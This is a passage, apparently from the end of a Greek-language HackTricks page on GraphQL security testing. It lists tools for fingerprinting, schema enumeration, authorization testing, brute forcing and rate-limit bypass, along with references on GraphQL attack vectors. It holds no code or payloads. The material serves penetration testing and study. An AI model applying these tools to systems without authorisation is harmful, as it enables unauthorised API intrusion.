* [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): Αναγνωρίζει τον τύπο του graphql που χρησιμοποιείται
* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Εργαλείο που μπορεί να χρησιμοποιηθεί για τη λήψη σχημάτων και την αναζήτηση ευαίσθητων δεδομένων, δοκιμή εξουσιοδότησης, επίθεση brute force στα σχήματα και εύρεση διαδρομών προς έναν συγκεκριμένο τύπο.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Μπορεί να χρησιμοποιηθεί ως αυτόνομο ή [επέκταση Burp](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Μπορεί να χρησιμοποιηθεί ως πελάτης CLI επίσης για την αυτοματοποίηση επιθέσεων
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Εργαλείο που καταλογογραφεί τους διαφορετικούς τρόπους προσέγγισης ενός συγκεκριμένου τύπου σε ένα σχήμα GraphQL.
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Επέκταση Burp για προηγμένη δοκιμή GraphQL. Το _**Scanner**_ είναι το πυρήνας του InQL v5.0, όπου μπορείτε να αναλύσετε ένα σημείο πρόσβασης GraphQL ή ένα τοπικό αρχείο εσωστρέφειας σχήματος. Δημιουργεί αυτόματα όλες τις πιθανές ερωτήσεις και μεταλλάξεις, τις οργανώνει σε δομημένη προβολή για την ανάλυσή σας. Το στοιχείο _**Attacker**_ σάς επιτρέπει να εκτελέσετε πακέτα επιθέσεων GraphQL, τα οποία μπορεί να είναι χρήσιμα για την παράκαμψη κακά υλοποιημένων ορίων ρυθμού.

### Πελάτες

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): Γραφικός πελάτης
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): Γραφικός Πελάτης

### Αυτόματες Δοκιμές

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* Βίντεο που εξηγεί το AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Αναφορές

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
